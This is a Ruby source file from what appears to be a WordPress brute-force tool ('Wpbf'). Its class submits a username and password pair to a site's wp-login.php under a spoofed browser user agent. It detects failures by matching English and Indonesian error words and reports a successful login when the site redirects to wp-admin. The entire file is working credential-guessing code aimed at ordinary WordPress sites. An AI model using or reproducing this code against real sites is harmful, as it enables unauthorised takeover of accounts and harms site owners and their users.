module Wpbf

	class Execution

		def initialize(url,uid,pwd)
			begin
				uri 			= URI(url + "/wp-login.php")
				http 			= Net::HTTP.new(uri.host, uri.port)
				if uri.scheme == "https"
					http.use_ssl 	= true
				end
				response 		= http.get(uri.request_uri)
				cookies 		= response['Set-Cookie']
				data 			= "log=#{uid}&pwd=#{pwd}&redirect_to=#{url}/wp-admin/&testcookie=1&wp-submit=Log+Masuk"
				headers 		= {
					'Cookie' 		=> "wordpress_test_cookie=WP+Cookie+check",
					'User-Agent' 	=> "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0",
					'Content-Type' 	=> 'application/x-www-form-urlencoded',
				}
				r = http.post(uri.request_uri, data, headers)

				if r.code == "200"
					if /incorrect|keliru|empty|kosong/.match(r.body)
						puts "- Username : #{uid} | Password : #{pwd} " + "[Incorrect]".yellow
					end
				elsif r.code == "302"
					if r.header['location'] == "#{url}/wp-admin/"
						puts "\n- Username : #{uid} | Password : #{pwd} [Login Successfull]\n".white
						exit
					end
				else
					puts "- Process has stoped, check your uri scheme if https or http"
				end

			rescue Exception => e
				puts "- #{e.message}"
				exit
			end
		end

	end # End Class

end # End Module